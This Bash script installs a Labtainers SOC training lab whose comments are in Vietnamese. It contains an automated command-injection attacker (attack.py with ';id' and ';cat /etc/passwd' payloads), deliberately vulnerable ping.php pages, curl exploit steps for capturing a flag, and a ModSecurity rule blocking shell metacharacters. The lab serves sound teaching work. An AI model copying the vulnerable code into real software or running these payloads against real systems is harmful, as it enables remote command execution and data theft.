#!/bin/bash
# ============================================================================
# Tu dong tao lab soc-patch-pwn (KB5 Hybrid: Patch & Pwn) tren VM Labtainers.
# Chay tren VM:  bash install-soc-patch-pwn.sh
# Sau do:        cd $LABTAINER_DIR/scripts/labtainer-student && rebuild soc-patch-pwn
# ============================================================================
set -e
if [ -z "$LABTAINER_DIR" ]; then echo "LOI: chua co bien LABTAINER_DIR (hay mo terminal Labtainers)"; exit 1; fi
LAB=$LABTAINER_DIR/labs/soc-patch-pwn
echo ">> Tao thu muc lab tai $LAB"
rm -rf "$LAB"
mkdir -p "$LAB"
mkdir -p "$LAB/attacker/_bin"
cat > "$LAB/attacker/_bin/fixlocal.sh" <<'__EOF_PP_5x9q__'
#!/bin/bash
# Chay LAN DAU tren container attacker (an). Khoi dong vong lap tan cong ngam.
setsid python3 /home/ubuntu/attack.py >/home/ubuntu/attack.log 2>&1 < /dev/null &
exit 0
__EOF_PP_5x9q__
mkdir -p "$LAB/attacker"
cat > "$LAB/attacker/attack.py" <<'__EOF_PP_5x9q__'
#!/usr/bin/env python3
# Tan cong tu dong: command injection vao ping.php tren 'targeta' (he A).
# Lien tuc ban de SIEM ghi nhan + de SV co gi ma dieu tra/va.
import urllib.request
import urllib.parse
import time

TARGET = "http://targeta"

PAYLOADS = [
    "/ping.php?host=127.0.0.1",                      # hop le (de so sanh)
    "/ping.php?host=127.0.0.1;id",                   # command injection
    "/ping.php?host=127.0.0.1;cat /etc/passwd",      # doc file
    "/ping.php?host=127.0.0.1|id",                   # bien the pipe
]


def req(path):
    url = TARGET + urllib.parse.quote(path, safe=":/?=&")
    try:
        with urllib.request.urlopen(url, timeout=5) as r:
            return r.getcode(), r.read().decode(errors="ignore")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception as e:
        return None, str(e)


for _ in range(60):
    code, _b = req("/ping.php?host=127.0.0.1")
    if code:
        break
    time.sleep(2)

while True:
    for p in PAYLOADS:
        code, body = req(p)
        hit = "uid=" in body
        print(time.strftime("%Y-%m-%d %H:%M:%S"), "HTTP", code, "RCE" if hit else "   ", p, flush=True)
    time.sleep(15)
__EOF_PP_5x9q__
mkdir -p "$LAB/config"
cat > "$LAB/config/about.txt" <<'__EOF_PP_5x9q__'
SOC Lab KB5 - Patch & Pwn (Hybrid Blue + Red).
Blue: he A cua ban dang bi tan cong command-injection lien tuc -> dieu tra qua SIEM va VA.
Red: dung chinh ky thuat do de PWN he B (qua HTTP), lay flag.
Muc tieu: A het bi dinh + lay duoc flag tu B.
__EOF_PP_5x9q__
mkdir -p "$LAB/config"
cat > "$LAB/config/parameter.config" <<'__EOF_PP_5x9q__'
# parameter.config - ca nhan hoa (chong chep bai)
# Flag tren B ca nhan hoa -> moi sinh vien pwn ra gia tri khac. Grading so khop loot==flag that.
FLAGVAL : RAND_REPLACE : targetb:.local/bin/fixlocal.sh : FLAGVAL : 100000 : 999999
__EOF_PP_5x9q__
mkdir -p "$LAB/config"
cat > "$LAB/config/start.config" <<'__EOF_PP_5x9q__'
# start.config - Lab soc-patch-pwn (KB5 Hybrid: Patch & Pwn)
# attacker (C) tan cong command-injection vao targeta (A) -> SV VA (Blue).
# SV dung chinh ky thuat do PWN targetb (B) qua HTTP de lay flag (Red).

GLOBAL_SETTINGS
	LAB_MASTER_SEED soc-patch-pwn_student_master_seed
	GRADE_CONTAINER targeta

NETWORK  SOC_NET
	MASK 172.20.0.0/24
	GATEWAY 172.20.0.101

# --- A: he cua sinh vien (web loi + Wazuh agent). SV phai VA de chan C ---
CONTAINER targeta
	USER ubuntu
	SOC_NET 172.20.0.10
	ADD-HOST attacker:172.20.0.5
	ADD-HOST siem:172.20.0.20
	ADD-HOST targetb:172.20.0.40
	TERMINALS 1

# --- B: he loi tuong tu, CHI truy cap qua HTTP (khong SSH). SV PWN lay flag ---
CONTAINER targetb
	USER ubuntu
	SOC_NET 172.20.0.40
	TERMINALS 0

# --- C: ke tan cong, chay ngam, ban command-injection vao A ---
CONTAINER attacker
	USER ubuntu
	SOC_NET 172.20.0.5
	ADD-HOST targeta:172.20.0.10
	TERMINALS 0

# --- SIEM: Wazuh (indexer + server + dashboard) ---
CONTAINER siem
	USER ubuntu
	SOC_NET 172.20.0.20
	ADD-HOST targeta:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	TERMINALS 1

# --- DEFENDER: tram sinh vien - Firefox xem dashboard + curl/python pwn B ---
CONTAINER defender
	USER ubuntu
	SOC_NET 172.20.0.30
	ADD-HOST siem:172.20.0.20
	ADD-HOST targeta:172.20.0.10
	ADD-HOST targetb:172.20.0.40
	ADD-HOST attacker:172.20.0.5
	X11 YES
	TERMINALS 1
__EOF_PP_5x9q__
mkdir -p "$LAB/defender/_bin"
cat > "$LAB/defender/_bin/student_startup.sh" <<'__EOF_PP_5x9q__'
#!/bin/bash
# Chay trong terminal ao cua defender. Mo Wazuh dashboard trong Firefox.
# Chi chay duoi quyen user thuong (khong phai root).
if ! id | grep -q 'uid=0'; then
  ( firefox https://172.20.0.20 >/dev/null 2>&1 & )
fi
__EOF_PP_5x9q__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-patch-pwn.attacker.student" <<'__EOF_PP_5x9q__'
#
# Labtainer Dockerfile - attacker (command injection tu dong, an)
#
ARG registry
FROM $registry/labtainer.network
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
RUN apt-get update && apt-get install -y --no-install-recommends python3 \
    && rm -rf /var/lib/apt/lists/* || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_PP_5x9q__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-patch-pwn.defender.student" <<'__EOF_PP_5x9q__'
#
# Labtainer Dockerfile - defender (tram analyst, co Firefox xem dashboard Wazuh)
#
ARG registry
# firefox3 = Firefox moi (tren network3) - chay duoc dashboard Wazuh hien dai
FROM $registry/labtainer.firefox3
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# Firefox co san trong base firefox3; them ssh client de SSH sang target xu ly su co
# apt-get update || true: tranh fail cung khi kho ben thu 3 (mozilla) sync do - openssh lay tu kho Ubuntu chinh
RUN apt-get update || true; apt-get install -y --no-install-recommends openssh-client curl \
    && rm -rf /var/lib/apt/lists/*
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
# Base firefox3 co the da co san user 'ubuntu' -> chi tao neu chua co
RUN id -u $user_name >/dev/null 2>&1 || useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_PP_5x9q__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-patch-pwn.siem.student" <<'__EOF_PP_5x9q__'
#
# Labtainer Dockerfile - siem (chay Wazuh: indexer + server + dashboard)
#
ARG registry
FROM $registry/labtainer.base2
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# Cong cu cho bake + cai offline (setcap = libcap2-bin)
RUN apt-get update && apt-get install -y --no-install-recommends curl gnupg tar libcap2-bin openssl \
    && rm -rf /var/lib/apt/lists/*
#
# Cho prestop doc alerts + agent_control khong can mat khau (de cham diem)
RUN echo 'ubuntu ALL=(ALL) NOPASSWD: /bin/cat /var/ossec/logs/alerts/alerts.log, /usr/bin/cat /var/ossec/logs/alerts/alerts.log, /var/ossec/bin/agent_control' > /etc/sudoers.d/labtainer-wazuh \
    && chmod 440 /etc/sudoers.d/labtainer-wazuh
#
# --- PRE-BAKE: tai goi Wazuh + tao chung chi luc BUILD (de first-boot cai OFFLINE) ---
RUN mkdir -p /root/wz && cd /root/wz \
 && curl -sO https://packages.wazuh.com/4.14/wazuh-install.sh \
 && bash wazuh-install.sh -dw deb -da amd64 \
 && curl -sO https://packages.wazuh.com/4.14/config.yml \
 && sed -i 's/<[a-z0-9-]*-ip>/127.0.0.1/g' config.yml \
 && bash wazuh-install.sh -g
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_PP_5x9q__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-patch-pwn.targeta.student" <<'__EOF_PP_5x9q__'
#
# Labtainer Dockerfile - targeta (he A: web loi + Wazuh agent, SV va)
#
ARG registry
FROM $registry/labtainer.network.ssh
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# Cho prestop doc access.log (640 root) khong mat khau
RUN echo '%sudo ALL=(ALL) NOPASSWD: /usr/bin/grep, /bin/grep, /usr/bin/cat, /bin/cat' > /etc/sudoers.d/labtainer-pp \
    && chmod 440 /etc/sudoers.d/labtainer-pp
#
# Web stack + WAF + ping (iputils-ping cho ping.php)
RUN apt-get update && ( \
      apt-get install -y --no-install-recommends apache2 php libapache2-mod-php libapache2-mod-security2 curl iputils-ping \
      || apt-get install -y --no-install-recommends apache2 libapache2-mod-php7.0 libapache2-mod-security2 curl iputils-ping \
    ) ; rm -rf /var/lib/apt/lists/*
#
# Wazuh agent (bake, tro ve manager 172.20.0.20)
RUN apt-get update && apt-get install -y --no-install-recommends apt-transport-https ca-certificates curl gnupg
RUN curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import \
    && chmod 644 /usr/share/keyrings/wazuh.gpg
RUN echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list
RUN apt-get update && WAZUH_MANAGER="172.20.0.20" apt-get install -y wazuh-agent
RUN systemctl enable wazuh-agent
RUN systemctl enable apache2 2>/dev/null || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_PP_5x9q__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-patch-pwn.targetb.student" <<'__EOF_PP_5x9q__'
#
# Labtainer Dockerfile - targetb (he B: web loi, chi HTTP, SV pwn lay flag)
#
ARG registry
FROM $registry/labtainer.network
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# Web stack + ping (khong Wazuh, khong modsec, khong SSH -> chi vao duoc qua HTTP)
RUN apt-get update && ( \
      apt-get install -y --no-install-recommends apache2 php libapache2-mod-php iputils-ping \
      || apt-get install -y --no-install-recommends apache2 libapache2-mod-php7.0 iputils-ping \
    ) ; rm -rf /var/lib/apt/lists/*
RUN systemctl enable apache2 2>/dev/null || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_PP_5x9q__
mkdir -p "$LAB/docs"
cat > "$LAB/docs/read_first.txt" <<'__EOF_PP_5x9q__'
=== SOC Lab KB5: Patch & Pwn (Hybrid Blue + Red) ===

He A (targeta, 172.20.0.10) cua ban dang bi tan cong COMMAND INJECTION lien tuc tu ke tan cong.
He B (targetb, 172.20.0.40) la may "production" co LO HONG Y HET A nhung chua duoc va.

Nhiem vu 2 phan:
  * BLUE (50%): dieu tra qua SIEM, VA he A de ke tan cong khong con chay duoc lenh.
  * RED  (50%): dung chinh ky thuat do PWN he B (chi qua HTTP), lay FLAG.

*** Lan dau: cho siem cai Wazuh xong (~8-10'):  tail -f /var/log/wazuh-install.log ***

==================== PHAN BLUE: VA HE A ====================
--- 1) Dieu tra (defender, Firefox) ---
  https://172.20.0.20  admin / (tren siem: sudo cat /root/wazuh-admin-credentials.txt)
  -> Xem su kien web: ke tan cong goi gi toi /ping.php? Payload command injection la gi?
     (goi y: host=127.0.0.1;id  -> dau ';' noi them lenh)

--- 2) Va he A (SSH tu defender) ---
  ssh analyst@targeta       (mat khau: analyst)
  Cach 1 (WAF): bat ModSecurity + rule chan ky tu nguy hiem:
    sudo sed -i 's/^SecRuleEngine .*/SecRuleEngine On/' /etc/modsecurity/modsecurity.conf
    sudo tee /etc/modsecurity/custom.conf >/dev/null <<'EOF'
    SecRule ARGS "@rx [;|&\`$()]" "id:100001,phase:2,deny,status:403,log,msg:'CMD injection blocked'"
    EOF
    sudo systemctl reload apache2
  Cach 2 (sua code): sua /var/www/html/ping.php dung escapeshellarg($host).
  Kiem chung: curl "http://localhost/ping.php?host=127.0.0.1;id"   # KHONG con dong uid=
              curl "http://localhost/ping.php?host=127.0.0.1"       # ping thuong van chay

==================== PHAN RED: PWN HE B ====================
--- 3) Khai thac B qua HTTP (tu defender) ---
  He B chi vao duoc qua web. Dung chinh lo hong command injection de doc flag:
    curl "http://172.20.0.40/ping.php?host=127.0.0.1;cat%20/var/www/flag.txt"
    -> doc FLAG-xxxxxx (moi sinh vien mot gia tri khac)
  Ghi flag ra /tmp/loot.txt tren B (bang chung PWN) de he thong cham diem:
    curl "http://172.20.0.40/ping.php?host=127.0.0.1;cat%20/var/www/flag.txt%20>%20/tmp/loot.txt"
  Ghi flag vao bao cao: sua /home/analyst/findings.txt tren A:  FLAG=FLAG-xxxxxx

Xong: checkwork / stoplab.
Muc tieu: mission_complete = Y  (blue_done: A het dinh + con song; red_done: pwn duoc B).
__EOF_PP_5x9q__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/goals.config" <<'__EOF_PP_5x9q__'
# goals.config - Hybrid Blue + Red

# Phat hien
siem_detected = boolean : _siem_detected
agent_connected = boolean : _agent_connected
reported = boolean : _reported

# BLUE: he A het dinh inject NHUNG dich vu van song
blue_done = boolean : ( _a_marker and _a_service and_not _a_vuln )
# RED: pwn duoc he B (lay dung flag)
red_done  = boolean : _b_pwned

# MUC TIEU TONG: hoan thanh ca Blue va Red
mission_complete = boolean : ( _a_marker and _a_service and_not _a_vuln and _b_pwned )
__EOF_PP_5x9q__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/results.config" <<'__EOF_PP_5x9q__'
# results.config - cham diem Hybrid (doc tu prestop cua targeta + targetb + siem)

# --- BLUE (he A) ---
_a_marker  = targeta:prestop.stdout : FILE_REGEX : PRESTOP_MARKER_A
# Con dinh command injection? (body chua uid= => lenh da chay)
_a_vuln    = targeta:prestop.stdout : FILE_REGEX : INJECT_UID=[1-9]
# Dich vu ping thuong con hoat dong?
_a_service = targeta:prestop.stdout : FILE_REGEX : NORMAL_PING=200
# Analyst ghi IOC?
_reported  = targeta:prestop.stdout : FILE_REGEX : FLAG=FLAG-[0-9]

# --- RED (he B) ---
_b_pwned   = targetb:prestop.stdout : FILE_REGEX : PWNED=YES

# --- SIEM ---
_siem_detected   = siem:prestop.stdout : FILE_REGEX : (ping.php|command|injection|web)
_agent_connected = siem:prestop.stdout : FILE_REGEX : targeta.*Active

# --- Goi y checkwork ---
#CHECK_FALSE: He A VAN dinh command injection (INJECT_UID>0). Hay va: bat WAF + rule chan ';|&', hoac dung escapeshellarg.
cw_vuln = targeta:prestop.stdout : FILE_REGEX : INJECT_UID=[1-9]
#CHECK_TRUE: Dich vu ping cua A phai con chay (NORMAL_PING=200) - dung chan nham.
cw_service = targeta:prestop.stdout : FILE_REGEX : NORMAL_PING=200
#CHECK_TRUE: Chua PWN duoc he B. Hay khai thac RCE lay flag: ...;cat /var/www/flag.txt > /tmp/loot.txt
cw_pwned = targetb:prestop.stdout : FILE_REGEX : PWNED=YES
__EOF_PP_5x9q__
mkdir -p "$LAB/siem/_bin"
cat > "$LAB/siem/_bin/fixlocal.sh" <<'__EOF_PP_5x9q__'
#!/bin/bash
# Lan khoi dong dau tren siem: tu cai Wazuh all-in-one o CHE DO NEN (~10-15 phut).
# $1 = mat khau sudo. Chi cai neu chua co (/var/ossec).
PW="$1"
if [ ! -d /var/ossec ]; then
  echo "$PW" | sudo -S nohup bash /home/ubuntu/wazuh-setup.sh >/dev/null 2>&1 &
fi
exit 0
__EOF_PP_5x9q__
mkdir -p "$LAB/siem/_bin"
cat > "$LAB/siem/_bin/prestop" <<'__EOF_PP_5x9q__'
#!/bin/bash
# prestop siem: chup bang chung Wazuh phat hien tan cong web (command injection) vao A.
trap "echo Timed out; exit" SIGTERM

echo "=== wazuh alerts (web / ping.php / 172.20.0.5) ==="
sudo -n cat /var/ossec/logs/alerts/alerts.log 2>/dev/null \
  | grep -iE 'ping.php|command|injection|web|172.20.0.5' | tail -50

echo "=== agents ==="
sudo -n /var/ossec/bin/agent_control -l 2>/dev/null
__EOF_PP_5x9q__
mkdir -p "$LAB/siem"
cat > "$LAB/siem/wazuh-setup.sh" <<'__EOF_PP_5x9q__'
#!/bin/bash
# Chay boi root o lan boot dau (goi tu fixlocal.sh). Cai Wazuh OFFLINE tu goi da bake san.
# Khong can internet. Tien do ghi vao /var/log/wazuh-install.log
cd /root/wz 2>/dev/null || cd /root
echo "[wazuh-setup] Cai Wazuh OFFLINE, bat dau luc $(date)" > /var/log/wazuh-install.log
bash wazuh-install.sh -a -o >> /var/log/wazuh-install.log 2>&1
echo "[wazuh-setup] Hoan tat luc $(date)" >> /var/log/wazuh-install.log
# Trich mat khau admin ra file de tien tra cuu
tar -O -xf /root/wz/wazuh-install-files.tar wazuh-install-files/wazuh-passwords.txt 2>/dev/null \
  | grep -A1 "'admin'" > /root/wazuh-admin-credentials.txt 2>/dev/null
__EOF_PP_5x9q__
mkdir -p "$LAB/targeta/_bin"
cat > "$LAB/targeta/_bin/fixlocal.sh" <<'__EOF_PP_5x9q__'
#!/bin/bash
# Chay LAN DAU tren targeta (he A), quyen user 'ubuntu'. $1 = mat khau sudo.
# Web ping.php dinh COMMAND INJECTION + ModSecurity cai san (TAT) + Wazuh agent + analyst.
PW="$1"

# ============ 1) Web app dinh command injection ============
cat > /tmp/ping.php <<'PHP'
<?php
// Cong cu kiem tra mang (CO LO HONG: noi chuoi vao lenh shell)
$host = isset($_GET['host']) ? $_GET['host'] : '127.0.0.1';
echo "<h3>Ping</h3><pre>";
system("ping -c1 " . $host);   // <== LO HONG: command injection
echo "</pre>";
?>
PHP
cat > /tmp/index.php <<'PHP'
<?php echo "<h2>NetTools</h2><a href='ping.php?host=127.0.0.1'>Ping 127.0.0.1</a>"; ?>
PHP
echo "$PW" | sudo -S mkdir -p /var/www/html
echo "$PW" | sudo -S cp /tmp/ping.php /tmp/index.php /var/www/html/
echo "$PW" | sudo -S rm -f /var/www/html/index.html 2>/dev/null

# ============ 2) ModSecurity: bat module, TAT engine (SV tu bat + viet rule) ============
for m in security2 php7.0 php7.2 php7.4 php8.1 php; do echo "$PW" | sudo -S a2enmod "$m" 2>/dev/null; done
echo "$PW" | sudo -S bash -c 'cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf 2>/dev/null'
echo "$PW" | sudo -S sed -i 's/^\s*SecRuleEngine .*/SecRuleEngine Off/' /etc/modsecurity/modsecurity.conf 2>/dev/null

# ============ 3) Khoi dong Apache ============
echo "$PW" | sudo -S systemctl enable apache2 2>/dev/null
echo "$PW" | sudo -S systemctl restart apache2 2>/dev/null \
  || echo "$PW" | sudo -S service apache2 restart 2>/dev/null || true

# ============ 4) Wazuh agent giam sat access.log ============
LF='<localfile><log_format>apache</log_format><location>/var/log/apache2/access.log</location></localfile>'
echo "$PW" | sudo -S sed -i "s#</ossec_config>#${LF}</ossec_config>#" /var/ossec/etc/ossec.conf 2>/dev/null
echo "$PW" | sudo -S systemctl restart wazuh-agent 2>/dev/null \
  || echo "$PW" | sudo -S service wazuh-agent restart 2>/dev/null || true

# ============ 5) analyst cho DEFENDER SSH sang va he A ============
echo "$PW" | sudo -S useradd -m -s /bin/bash analyst 2>/dev/null
echo "$PW" | sudo -S bash -c 'echo "analyst:analyst" | chpasswd'
echo "$PW" | sudo -S usermod -aG sudo analyst 2>/dev/null
cat > /tmp/findings.txt <<'FND'
# BAO CAO - dien gia tri ban tim duoc (giu dinh dang KEY=value):
PAYLOAD=
FLAG=
FND
echo "$PW" | sudo -S cp /tmp/findings.txt /home/analyst/findings.txt
echo "$PW" | sudo -S chown analyst:analyst /home/analyst/findings.txt
echo "$PW" | sudo -S chmod 644 /home/analyst/findings.txt

exit 0
__EOF_PP_5x9q__
mkdir -p "$LAB/targeta/_bin"
cat > "$LAB/targeta/_bin/prestop" <<'__EOF_PP_5x9q__'
#!/bin/bash
# prestop he A (Blue): tu-test lenh inject co con chay khong + ping thuong con 200 khong.
trap "echo Timed out; exit" SIGTERM

echo "PRESTOP_MARKER_A"
# ;id -> neu con dinh, body chua 'uid='
echo "INJECT_UID=$(curl -s 'http://localhost/ping.php?host=127.0.0.1%3Bid' | grep -c 'uid=')"
echo "NORMAL_PING=$(curl -s -o /dev/null -w '%{http_code}' 'http://localhost/ping.php?host=127.0.0.1')"

echo "=== modsec ==="
grep -hE '^[[:space:]]*SecRuleEngine' /etc/modsecurity/modsecurity.conf 2>/dev/null
grep -rhE 'SecRule' /etc/modsecurity 2>/dev/null | grep -vi recommended | tail -10

echo "=== access.log - command injection tu attacker (172.20.0.5) ==="
sudo -n grep -iE 'ping.php.*(;|%3B|\||id|cat)' /var/log/apache2/access.log 2>/dev/null | grep '172.20.0.5' | tail -10

echo "=== findings.txt ==="
cat /home/analyst/findings.txt 2>/dev/null
__EOF_PP_5x9q__
mkdir -p "$LAB/targeta/_bin"
cat > "$LAB/targeta/_bin/treataslocal" <<'__EOF_PP_5x9q__'
apache2
modsecurity
__EOF_PP_5x9q__
mkdir -p "$LAB/targetb/_bin"
cat > "$LAB/targetb/_bin/fixlocal.sh" <<'__EOF_PP_5x9q__'
#!/bin/bash
# Chay LAN DAU tren targetb (he B), quyen user 'ubuntu'. $1 = mat khau sudo.
# He B co lo hong command injection Y HET A, nhung KHONG duoc va -> SV khai thac lay flag.
PW="$1"

# Web app dinh command injection (giong A)
cat > /tmp/ping.php <<'PHP'
<?php
$host = isset($_GET['host']) ? $_GET['host'] : '127.0.0.1';
echo "<h3>Ping</h3><pre>";
system("ping -c1 " . $host);   // LO HONG: command injection
echo "</pre>";
?>
PHP
cat > /tmp/index.php <<'PHP'
<?php echo "<h2>NetTools (prod)</h2><a href='ping.php?host=127.0.0.1'>Ping</a>"; ?>
PHP
echo "$PW" | sudo -S mkdir -p /var/www/html
echo "$PW" | sudo -S cp /tmp/ping.php /tmp/index.php /var/www/html/
echo "$PW" | sudo -S rm -f /var/www/html/index.html 2>/dev/null

# Flag (ca nhan hoa) - www-data doc duoc -> SV phai RCE moi lay ra
echo 'FLAG-FLAGVAL' > /tmp/flag.txt
echo "$PW" | sudo -S cp /tmp/flag.txt /var/www/flag.txt
echo "$PW" | sudo -S chmod 644 /var/www/flag.txt
echo "$PW" | sudo -S rm -f /tmp/flag.txt

# Khoi dong Apache
echo "$PW" | sudo -S systemctl enable apache2 2>/dev/null
echo "$PW" | sudo -S systemctl restart apache2 2>/dev/null \
  || echo "$PW" | sudo -S service apache2 restart 2>/dev/null || true

exit 0
__EOF_PP_5x9q__
mkdir -p "$LAB/targetb/_bin"
cat > "$LAB/targetb/_bin/prestop" <<'__EOF_PP_5x9q__'
#!/bin/bash
# prestop he B (Red): kiem tra SV da PWN duoc chua.
# SV khai thac RCE de ghi flag that vao /tmp/loot.txt (www-data tao, 644 -> doc duoc).
trap "echo Timed out; exit" SIGTERM

echo "PRESTOP_MARKER_B"
LOOT="$(cat /tmp/loot.txt 2>/dev/null | tr -d '\r' | head -1)"
REAL="$(cat /var/www/flag.txt 2>/dev/null | tr -d '\r' | head -1)"
echo "LOOT=$LOOT"
if [ -n "$LOOT" ] && [ "$LOOT" = "$REAL" ]; then
  echo "PWNED=YES"
else
  echo "PWNED=NO"
fi
__EOF_PP_5x9q__
mkdir -p "$LAB/targetb/_bin"
cat > "$LAB/targetb/_bin/treataslocal" <<'__EOF_PP_5x9q__'
apache2
__EOF_PP_5x9q__

echo ">> Cap quyen thuc thi + chuan hoa EOL (LF)"
chmod +x "$LAB"/attacker/_bin/*.sh "$LAB"/targeta/_bin/* "$LAB"/targetb/_bin/* "$LAB"/siem/_bin/* "$LAB"/defender/_bin/*.sh "$LAB"/siem/*.sh "$LAB"/attacker/*.py 2>/dev/null || true
find "$LAB" -type f -exec sed -i 's/\r$//' {} +
echo ">> XONG. Tiep theo:  cd \$LABTAINER_DIR/scripts/labtainer-student && rebuild soc-patch-pwn"
